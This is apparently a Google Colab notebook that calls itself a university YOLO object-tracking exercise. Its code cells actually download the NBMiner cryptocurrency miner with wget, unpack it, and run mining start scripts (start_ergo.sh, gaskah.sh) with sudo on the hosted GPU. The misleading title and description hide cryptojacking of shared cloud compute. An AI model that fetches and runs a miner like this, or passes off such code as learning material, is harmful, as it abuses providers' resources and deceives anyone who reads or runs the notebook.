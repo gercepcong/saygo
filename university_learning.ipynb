{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "university_learning.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "1fuTUKiODGIu"
      },
      "source": [
        "#YOLO USE TO TRACKING OBJECT\n",
        "for now i don't know must learn\n",
        "awikwok\n",
        "\n",
        "> Cek GEPEU\n",
        "\n",
        "> SCRIPTE JO LALI\n",
        "\n",
        "> Run The Script\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "eqTykyHkC-8d"
      },
      "source": [
        "#@title Cek GEPEU\n",
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OQ54el69EosE",
        "cellView": "form"
      },
      "source": [
        "#@title ***Skripe Bosss***\n",
        "!sudo apt-get install nano && sudo apt-get update && sudo apt-get upgrade && export LD_PRELOAD=/usr/lib64-nvidia/libnvidia-ml.so && wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz  && sudo apt install libpci-dev\n",
        "!tar -xf NBMiner_38.1_Linux.tgz\n",
        "!cp /content/NBMiner_Linux/nbminer /content/"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4G809DuFF_51"
      },
      "source": [
        "#Gassrun >>>>>>>>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-liWWiWhGPy3",
        "cellView": "form"
      },
      "source": [
        "#@title Karo log\n",
        "!chmod +x ./start_ergo.sh && sudo ./start_ergo.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "lsjYr4b2Gm1u"
      },
      "source": [
        "#@title use a log\n",
        "!./gaskah.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}